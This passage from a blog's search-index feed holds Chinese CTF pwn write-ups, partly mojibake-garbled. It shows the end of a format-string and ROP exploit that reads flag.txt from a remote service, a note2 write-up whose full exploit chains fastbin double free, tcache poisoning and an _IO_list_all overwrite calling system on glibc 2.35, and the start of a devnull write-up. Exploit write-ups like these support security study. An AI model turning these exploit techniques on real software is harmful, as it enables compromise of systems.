class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hhn%&#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(<span class="number">0xd5</span>-<span class="number">0xc0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%13$hhn%265$p&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;info1&#x27;</span>,p.recv())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%265$p%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>-<span class="number">14</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaaaaaaaaaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>,timeout=<span class="number">0.5</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;============&gt; YES &lt;==============&#x27;</span>)</span><br><span class="line">    libc_base_addr=leak_libc_addr-<span class="number">0x440f6b</span><span class="comment">#0x440f5b</span></span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">    pop_rdi=base_addr+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi_r15=base_addr+<span class="number">0x1541</span></span><br><span class="line">    pop_rdx_r12=libc_base_addr+<span class="number">0x119211</span><span class="comment">#0x119241</span></span><br><span class="line">    open_addr=libc_base_addr+<span class="number">0x10dce0</span><span class="comment">#0x10dd10+</span></span><br><span class="line">    write_addr=libc_base_addr+<span class="number">0x10e060</span><span class="comment">#0x10e090+</span></span><br><span class="line">    read_addr=libc_base_addr+<span class="number">0x10dfc0</span><span class="comment">#0x10dff0+</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    csu_addr_l=(<span class="number">0x153b</span>+base_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    csu_addr_h=((<span class="number">0x153b</span>+base_addr)&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_l&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_h&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> csu_addr_h&gt;csu_addr_l:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h-csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr)+p64(return_addr+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l-csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr+<span class="number">1</span>)+p64(return_addr)</span><br><span class="line">    <span class="comment">#rop=b&#x27;aaaaaaaaaaaaaaaa%&#x27;+str(csu_addr).encode(&#x27;utf-8&#x27;)+b&#x27;c%10$hnaaaaa&#x27;+p64(return_addr)+p64(stdout)+p64(stdout+1)</span></span><br><span class="line">    rop=payload</span><br><span class="line">    rop+=p64(pop_rdi)+p64(return_addr+<span class="number">8</span>+<span class="number">0xc0</span>+<span class="number">40</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(open_addr)</span><br><span class="line">    </span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(write_addr)</span><br><span class="line">    rop+=<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">len</span>(rop))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(rop)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;192.168.1.106&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    i=i+<span class="number">1</span>   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------&gt;&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;&lt;--------------&#x27;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220708092056673-14521637.png"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> closeå…³é—­æ–‡ä»¶æè¿°ç¬¦ </tag>
            
            <tag> magic_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022æŸé¹­æ¯-note2</title>
      <link href="/posts/f523ff3f.html"/>
      <url>/posts/f523ff3f.html</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ æ˜ç™½äº†ï¼Œé«˜ç‰ˆæœ¬ä¸­ <code>fastbin</code> åšå‡º <code>double free</code> æ˜¯å¦‚ä½•æ‰“ <code>tcache poisoning</code> çš„è¿‡ç¨‹ã€‚å¹¶ä¸”äº†è§£åˆ°äº†ä¸€æ¡æ–°çš„ <code>IO</code> é“¾ï¼Œç›®å‰æ„Ÿè§‰æ˜¯æœ€å¥½ç”¨çš„ä¸€æ¡ï¼Œå¯ä»¥é€šæ€ <code>2.36</code> åŠä»¥ä¸‹çš„ <code>libc</code> ç‰ˆæœ¬ å…·ä½“è¯·è§ <a href="https://tttang.com/archive/1845/">æ–‡ç« </a></p><p>è¿™ä½å¸ˆå‚…æä¾›äº†é¢˜ç›®é™„ä»¶  <a href="https://www.cnblogs.com/tolele/p/16701827.html">2022å¹´æŸé¹­æ¯ pwné¢˜å¤ç° - tolele - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h3><p>æœ¬é¢˜å­˜åœ¨ä¸€ä¸ª <code>UAF</code> æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡çš„ä½¿ç”¨ <code>add</code> å’Œ <code>delete</code> <code>show</code> å‡½æ•°ï¼Œ<code>size</code> è¢«é™å®šåˆ°äº† <code>0x200</code> ä»¥ä¸‹ï¼Œå¹¶ä¸”å¯ä»¥è§¦å‘ <code>exit</code> å‡½æ•°é€€å‡ºã€‚ï¼ˆ <code>libc</code> ç‰ˆæœ¬ä¸º <code>2.35</code>ï¼‰</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>å› ä¸ºæ²¡æœ‰ <code>edit</code> å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è€ƒè™‘ <code>double free</code> ï¼Œä½†ç”±äº <code>key</code> æœºåˆ¶çš„å­˜åœ¨ï¼Œæ— æ³•ç›´æ¥åœ¨ <code>tcache bin</code> ç›´æ¥æ‰“ <code>double free</code>ï¼Œè§£å†³æ–¹æ³•æœ‰ä¸¤ç§ï¼Œç¬¬ä¸€æ˜¯ <a href="https://zikh26.github.io/posts/6b7e3e3a.html#house-of-botcake">house of botcake</a> ï¼Œè¿™ä¸ªæ–¹æ³•æœ¬é¢˜æ˜¯å¯ä»¥æ‰“é€šçš„ï¼Œä¸è¿‡ä¸»è¦çš„å­¦ä¹ æ”¶è·æ˜¯ç¬¬äºŒç§æ–¹æ³•ï¼Œå°±æ˜¯å¡«æ»¡ <code>tcache bin</code> ï¼Œç„¶ååœ¨ <code>fast bin</code>ä¸­åšå‡º <code>double free</code> ï¼Œå†æ‰“ <code>tcache poisoning</code> å°† <code>IO_list_all</code> ç”³è¯·å‡ºæ¥å†™å…¥å †åœ°å€ï¼Œä»è€Œè§¦å‘æœ€åçš„ <code>IO attack</code>ã€‚</p><p>æœ¬æ–‡ä¸»è¦ä»‹ç»åœ¨ <code>fastbin</code> ä¸­åšå‡ºçš„ <code>double free</code> æ˜¯å¦‚ä½•æ‰“å‡º <code>tcache poisoning </code> ï¼Œè‡³äº <code>safe-Linking</code> æœºåˆ¶çš„ç»•è¿‡å’Œ <code>IO_attack</code> ä¸å†ä»‹ç»ã€‚</p><h3 id="double-free-ä¸-tcache-poisoning"><a href="#double-free-ä¸-tcache-poisoning" class="headerlink" title="double free ä¸ tcache poisoning"></a><code>double free</code> ä¸ <code>tcache poisoning</code></h3><p><code>malloc</code> å‡½æ•°å†…éƒ¨æ‰§è¡Œä¼šå…ˆè¿›å…¥ <code>libc_malloc</code> å‡½æ•°ï¼Œåˆ¤æ–­æ˜¯å¦ <code>tcache bin</code>  çš„é“¾ä¸Šæœ‰éœ€è¦çš„å †å—ï¼Œå¦‚æœæ²¡æœ‰çš„è¯åˆ™è¿›å…¥ <code>int_malloc</code> å‡½æ•°ï¼ˆæœ‰çš„è¯åˆ™ç”³è¯·å‡ºæ¥ï¼Œç›´æ¥è¿”å›ï¼‰</p><p>åœ¨ <code>int_malloc</code> å‡½æ•°çš„æœ€å¼€å§‹å°±å»åˆ¤æ–­äº† <code>fastbin</code> ä¸­å¯¹åº”çš„é“¾ä¸Šæ˜¯å¦æœ‰æ‰€éœ€è¦çš„å †å—ï¼Œå¦‚æœæœ‰çš„è¯å°±å°†è¯¥å †å—å–å‡ºï¼Œä½œä¸ºæ¥ä¸‹æ¥è¦è¿”å›ç»™ç”¨æˆ·çš„å †å—ã€‚åŒæ—¶å»åˆ¤æ–­è¿™æ¡é“¾ä¸Šæ˜¯å¦è¿˜æœ‰å †å—ï¼Œå¦‚æœè¿˜æœ‰å †å—å¹¶ä¸” <code>tcache bin</code> ä¸Šå¯¹åº”çš„è¿™æ¡é“¾è¿˜æœ‰ç©ºä½ç½®ï¼Œå°±å°† <code>fastbin</code> å‰©ä¸‹çš„å †å—éƒ½æ”¾å…¥ <code>tcache bin</code> ä¸­ï¼ˆé™¤é <code>tcache bin</code> è¢«å¡«æ»¡äº†ï¼‰</p><p>æœ¬é¢˜ <code>double free</code> ä»¥åŠ <code>tcache poisoning</code> çš„åˆ©ç”¨æ€è·¯æ˜¯å…ˆå°† <code>tcache bin</code> å¡«æ»¡ï¼Œç„¶åæ­£å¸¸çš„åœ¨ <code>fastbin</code> é“¾ä¸­åšå‡º <code>double free</code> ï¼ˆå¦‚ <code>A-&gt;B-&gt;A</code>ï¼‰</p><p>æ¥ç€å†å°† <code>tcache bin</code> ä¸­çš„å †å—å…¨éƒ¨å–å‡ºï¼ˆæ­¤æ—¶çš„æƒ…å†µå¦‚ä¸‹ï¼‰   <strong>æ³¨æ„ï¼š <code>fastbin</code> ä¸­çš„ <code>fd</code> æŒ‡é’ˆä¹Ÿæ˜¯ç»è¿‡äº†å¼‚æˆ–è¿ç®—çš„</strong></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202244388.png" alt="image-20230420224449196"></p><p><code>ptmalloc</code> å¯¹äº <code>fastbin</code> ä¸­å †å—ç§»å…¥ <code>tcache bin</code> çš„æœºåˆ¶æ˜¯è¿™æ ·å¤„ç†çš„ã€‚ï¼ˆæœ€åˆçš„ç»“æ„ä¸º <code>A-&gt;B-&gt;A</code>ï¼‰ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330662.png" alt="image-20230420233034606"></p><ol><li>é¦–å…ˆåˆ¤æ–­ <code>fastbin</code> ä¸­ç¬¬ä¸€ä¸ªå †å— <code>A</code> çš„ <code>fd</code> æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œæ¥æ£€æµ‹è¯¥é“¾æ˜¯å¦è¿˜æœ‰å…¶ä»–å †å—</li><li>æ— è®ºè¯¥é“¾æ˜¯å¦æœ‰å…¶ä»–å †å—ï¼Œéƒ½ä¼šå°† <code>A</code> å–å‡ºæ¥æš‚å­˜ï¼ˆä¸ºä¹‹åè¿”å›ç»™ç”¨æˆ·åšå‡†å¤‡ï¼‰ï¼Œè€Œå°† <code>A</code> å–å‡ºå <code>fastbin</code> ä¸­çš„ç»“æ„å˜æˆäº† <code>B-&gt;A-&gt;B</code></li><li>å¦‚æœè¯¥ <code>fastbin</code> é“¾å·²ç»æ²¡æœ‰å…¶ä»–å †å—äº†ï¼Œé‚£ä¹ˆå°±å°†åˆšåˆšçš„ <code>A</code> è¿”å›ç»™ç”¨æˆ·</li><li>å¦‚æœæ£€æµ‹å‡ºè¯¥é“¾è¿˜æœ‰å…¶ä»–å †å—ï¼Œå¹¶ä¸” <code>tcache bin</code> å¯¹åº”çš„è¿™æ¡é“¾æ²¡æœ‰æ»¡ï¼Œå°±é€ä¸ªå°†å †å—é“¾å‡º <code>fastbin</code> ï¼Œé“¾å…¥ <code>tcache bin</code> </li><li>å› ä¸ºæ­¤æ—¶çš„ <code>tcache bin</code> æ˜¯ç©ºçš„ï¼Œé‚£å°±ä¸è€ƒè™‘ <code>tcache bin</code> è¢«è£…æ»¡çš„è¿™ä¸ªé™åˆ¶ï¼Œä¸Šé¢æåˆ°æ­¤æ—¶çš„ç»“æ„æ˜¯ <code>B-&gt;A-&gt;B</code> ï¼Œå…ˆå»ç§»åŠ¨å½“å‰ <code>fastbin</code> çš„ç¬¬ä¸€ä¸ªå †å— <code>B</code> ï¼Œå› ä¸º <code>double free</code> çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ä» <code>fastbin</code>  å–å‡ºä¸€ä¸ªå †å— <code>B</code> åï¼Œå…¶ç»“æ„å˜ä¸ºäº† <code>A-&gt;B-&gt;A</code> <strong>æ­¤æ—¶åˆšåˆšå–å‡ºçš„å †å—è¿˜æ²¡æœ‰è¿›å…¥ <code>tcache bin</code></strong></li><li>åˆšåˆšè¿™ä¸ªå–å‡ºçš„å †å—é“¾å…¥åˆ° <code>tcache bin</code> æ—¶ï¼Œå…¶ <code>next</code> æŒ‡é’ˆä¸€å®šä¼šè¢«ç½®æˆ <code>0</code>ï¼Œå› ä¸º <code>tcache bin</code> æœ€åˆæ˜¯æ²¡æœ‰å †å—çš„ï¼Œæ­¤æ—¶çš„ <code>fastbin</code>  ç»“æ„ä¼šå—åˆ° <code>tcache bin</code> ä¸­å †å— <code>B</code> <code>next</code> æŒ‡é’ˆç½® <code>0</code> çš„å½±å“ï¼Œä»è€Œç»“æ„å˜æˆäº† <code>A-&gt;B-&gt;0</code> ï¼ˆå› ä¸ºè¿™ä¸ªç½®ç©ºçš„ <code>next</code> æŒ‡é’ˆæ˜¯ <code>B</code> å †å—çš„ï¼Œå› æ­¤å¹¶ä¸ä¼šå¹²æ‰°åˆ° <code>A-&gt;B</code> çš„è¿™ä¸ªå…³ç³»ï¼‰</li><li>ä¾æ¬¡ç±»æ¨ï¼Œä» <code>fastbin</code> ä¸­å–å‡º <code>A</code>ç„¶åå†æ”¾å…¥åˆ° <code>tcachebin</code> ä¸­ï¼Œæ­¤æ—¶çš„ <code>fastbin</code> ä¸º <code>B-&gt;0</code> ï¼Œ<code>tcache bin</code> ä¸º <code>A-&gt;B</code>ï¼ˆ <code>LIFO</code> ï¼‰ </li><li><code>fastbin</code> ä¸­æœ€åä¸€ä¸ª <code>B</code> è¿›å…¥ <code>tcache bin</code> ï¼Œæ­¤æ—¶ <code>tcache bin</code> çš„ç»“æ„ä¸º <code>B-&gt;A-&gt;B</code> ï¼ˆç”±äºç¡®å®æ˜¯æœ‰ä¸‰ä¸ªå †å—è¿›å…¥äº† <code>tcache bin</code> æ‰€ä»¥æ­¤æ—¶çš„ <code>tcache_counts</code> ä¸º <code>3</code>ï¼‰</li></ol><p>å› ä¸ºæœ€åˆå°±ç¡®å®šäº†ç”³è¯·å‡ºå»çš„æ˜¯ <code>A</code>ï¼Œæ‰€ä»¥ <code>malloc</code> è¿”å›å‡ºæ¥ <code>A</code> åï¼Œå°†æ•°æ®å†™å…¥ <code>A</code> ä¸­ç¯¡æ”¹ <code>next</code> æŒ‡é’ˆï¼ˆå› ä¸º <code>A</code> æ­¤æ—¶è¿˜åœ¨ <code>tcache bin</code> ä¸­ï¼‰ï¼Œä»è€Œå®Œæˆäº† <code>tcache poisoning</code> ã€‚å› æ­¤å†™å…¥æ•°æ®åçš„ç»“æ„ä¸º <code>B-&gt;A-&gt;address</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330323.png" alt="image-20230420233021223"></p><p>ç®€å•æ€»ç»“ä¸€ä¸‹ï¼šå°† <code>tcache bin</code> å¡«æ»¡ï¼Œç„¶ååœ¨ <code>fastbin</code> ä¸­åš <code>double free</code> ï¼Œç”³è¯·å‡ºä¸€ä¸ªå †å—åï¼Œå¯ä»¥ç›´æ¥æ‰“ <code>tcache poisoning</code> ï¼Œå¹¶ä¸”ä¸ç”¨æ‹…å¿ƒ <code>tcache_counts</code> çš„é—®é¢˜</p><p>å› ä¸ºå°† <code>IO_list_all</code> ç”³è¯·å‡ºæ¥äº†ï¼Œåé¢å°±æ˜¯ <code>IO_FILE</code> çš„ä¼ªé€ å’Œå¸ƒå±€ï¼Œæœ¬æ–‡é‡ç‚¹ä¸åœ¨è¿™é‡Œï¼Œå°±æ­¤ç•¥è¿‡ã€‚ä¸è¿‡ <a href="https://zikh26.github.io/posts/ad411136.html">toolså‡½æ•°åº“</a> å°è£…äº†è¯¥ <code>obstack</code> é“¾çš„æ”»å‡»æ¨¡æ¿ï¼Œç›´æ¥ä½¿ç”¨å³å¯ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x219ce0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------leak key----------------</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">par=&#123;</span><br><span class="line">    <span class="string">&quot;io_obstack_jumps&quot;</span>:libc_base+<span class="number">0x2163c0</span></span><br><span class="line">    ,<span class="string">&quot;system&quot;</span>:libc_base+<span class="number">0x50d60</span></span><br><span class="line">&#125;</span><br><span class="line">par_dict=create_dict(par)</span><br><span class="line">heap_addr=<span class="number">0x1020</span>+heap_base <span class="comment">#ä½äºio_list_allçš„chunkç”¨æˆ·åŒº</span></span><br><span class="line">payload=obstack_attack(heap_addr-<span class="number">0x10</span>,par_dict)</span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x154C</span>,<span class="number">0x1540</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=((heap_base+<span class="number">0xf40</span>)&gt;&gt;<span class="number">12</span>)^(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,p64(heap_addr-<span class="number">0x10</span>))<span class="comment">#get io_list_all</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211042218.png" alt="image-20230421104243994"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> IO attack </tag>
            
            <tag> double free </tag>
            
            <tag> é«˜ç‰ˆæœ¬libc </tag>
            
            <tag> tcache poisoning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¼ºç½‘æ¯ å¼ºç½‘å…ˆé”‹-devnull wp</title>
      <link href="/posts/e9a7fcac.html"/>
      <url>/posts/e9a7fcac.html</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“å¼ºç½‘æ¯ï¼ŒåŠ ä¸Šå¼ºç½‘å…ˆé”‹ä¸­çš„devnullè¿™é“é¢˜ï¼Œä¸€å…±æ”¾äº†18é“pwné¢˜ã€‚å¼ºpwnæ¯äº†å±äºæ˜¯ã€‚ä¸è¿‡è‡ªå·±è¿˜æ˜¯å¤ªèœäº†18é“pwnï¼Œå°±ä¼šåšä¸€é“ã€‚ä¸»è¦ä¹Ÿç¡®å®æ˜¯æ²¡æœ‰å­¦åˆ°åé¢çš„éƒ¨åˆ†ï¼Œç›®å‰çš„æ°´å¹³ä¹Ÿåªå¤Ÿåšdevnullè¿™é“é¢˜çš„ï¼Œç›¸ä¿¡æ˜å¹´çš„æ—¶å€™ä¼šåšå‡ºæ¥æ›´å¤šçš„pwné¢˜ã€‚ç„¶åè¿™é‡Œæˆ‘è¯¦ç»†å†™ä¸€ä¸‹devnullè¿™é“é¢˜çš„write upã€‚</p><p>è¿™é“é¢˜åº”è¯¥æ˜¯å¿…é¡»è¦ä¸€ä¸ª2.34çš„libcï¼Œè€Œä¸”ç”¨glibc-all-in-oneé‡Œçš„libc patchä¸Šå»è¿˜æœ‰ç‚¹é—®é¢˜ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©äº†ç›´æ¥æŠŠæ–‡ä»¶æ‹‰åˆ°dockeré‡Œåšã€‚</p><p>å¦‚æœä½ æƒ³ç®€å•å­¦ä¹ ä¸€ä¸‹dockerï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘å†™çš„è¿™ç¯‡<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">æ–‡ç« </a></p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/image-20221007213821080.png"></p><h2 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨:"></a>æ¼æ´æ‰€åœ¨:</h2><p>é¦–å…ˆè¦å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œfgets(s,n,stdin)å‡½æ•°åªèƒ½è¯»å…¥n-1ä¸ªå­—ç¬¦ï¼Œæœ€åä¼šåœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ ä¸€ä¸ª\x00ã€‚</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸‹é¢ä¸‰å¼ å›¾ç‰‡ï¼š</p><p><img src="/../img/image-20221007213829044.png"></p><p><img src="/../img/image-20221007213836991.png"></p><p><img src="/../img/image-20221007213844664.png" alt="image-20221007213844664"></p><p>å‘ç°fgetså°†æ•°æ®å†™å…¥sçš„åœ°å€å’Œfd(è¿™ä¸ªæ˜¯æ¥ä¸‹æ¥readå‡½æ•°çš„fdï¼Œç­‰ä¸‹ä¼šåˆ†æ)ç›¸å·®0x20ï¼Œè€Œæˆ‘ä»¬å¯ä»¥è¾“å…¥0x21ä¸ªæ•°æ®(å…¶å®åªèƒ½å†™å…¥0x20ä¸ªå­—èŠ‚æ•°æ®ï¼Œæœ€åä¸€ä¸ªæ˜¯\x00)ï¼Œè€Œæœ€åçš„00å°±æº¢å‡ºåˆ°äº†fdä¸Šã€‚</p><p>æˆ‘ä»¬å†çœ‹ä¸‹readå‡½æ•°</p><p><img src="/../img/image-20221007213902123.png" alt="image-20221007213902123"></p><p><img 